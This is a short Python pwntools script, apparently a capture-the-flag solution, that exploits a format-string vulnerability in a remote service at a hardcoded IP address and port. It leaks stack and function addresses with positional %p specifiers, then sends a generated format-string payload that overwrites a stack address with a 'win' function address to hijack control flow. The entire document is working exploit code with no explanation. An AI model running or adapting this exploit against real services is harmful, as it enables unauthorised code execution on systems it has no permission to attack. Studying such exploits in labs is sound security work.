#!/usr/bin/python3
from pwn import *
import sys

context.clear(endian = "little")
context.clear(arch = "amd64")
p = remote("195.37.209.19", 9001)

p.sendline(b"%72$p %75$p")
p.sendline(b"1234")
vals = p.recvline().strip()[19:].split()

win_addr = int(vals[0][2:],16)
stack_addr = int(vals[1][2:],16)

target_addr = stack_addr + 40
context.bits = 64
p.sendline(fmtstr_payload(8, {target_addr: win_addr}, 0))
print(p.recvall())
